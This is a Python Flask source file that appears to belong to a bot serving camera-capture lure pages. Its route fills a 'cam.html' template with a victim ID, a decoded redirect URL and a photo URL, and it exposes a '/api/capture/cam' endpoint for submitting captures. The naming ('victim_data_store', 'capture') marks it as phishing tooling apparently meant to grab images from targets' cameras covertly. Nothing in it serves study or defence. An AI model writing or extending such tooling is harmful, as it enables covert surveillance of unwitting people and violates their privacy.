import os
from flask import request
from bot.servers.base import create_capture_route
from bot.utils.storage import victim_data_store, decode_redirect


def register_cam_routes(app):
    @app.route('/p/cam/<uid>')
    def cam_page(uid):
        victim_id = request.args.get('v', 'unknown')
        encoded_r = request.args.get('r', '')

        # ===== REDIRECT FROM URL PARAM =====
        redirect_url = decode_redirect(encoded_r) if encoded_r else None

        # Fallback to memory/file
        if not redirect_url:
            redirect_url = victim_data_store.get(f"redirect_{victim_id}")

        # Photo from memory/file
        photo_url = victim_data_store.get(f"photo_{victim_id}")

        # Debug logs
        print(f"🔍 CAM PAGE HIT")
        print(f"🔍 VICTIM ID: {victim_id}")
        print(f"🔍 ENCODED R: {encoded_r[:50] if encoded_r else 'NONE'}")
        print(f"🔍 DECODED REDIRECT: {redirect_url}")
        print(f"🔍 PHOTO: {photo_url[:60] if photo_url else 'NONE'}")

        # Fallbacks
        if not redirect_url or not redirect_url.startswith('http'):
            redirect_url = 'https://google.com'
            print(f"⚠️ FALLBACK TO GOOGLE")

        if not photo_url or not photo_url.startswith('http'):
            photo_url = 'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=Photo'

        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        html_path = os.path.join(base_dir, 'web', 'pages', 'cam.html')

        try:
            with open(html_path, 'r', encoding='utf-8') as f:
                html = f.read()
        except FileNotFoundError:
            return f"❌ Cam page not found at {html_path}", 404

        html = html.replace('{{REDIRECT_URL}}', redirect_url)
        html = html.replace('{{VICTIM_ID}}', str(victim_id))
        html = html.replace('{{PHOTO_URL}}', photo_url)
        return html

    @app.route('/api/capture/cam', methods=['POST'])
    def capture_cam():
        return create_capture_route('cam')()
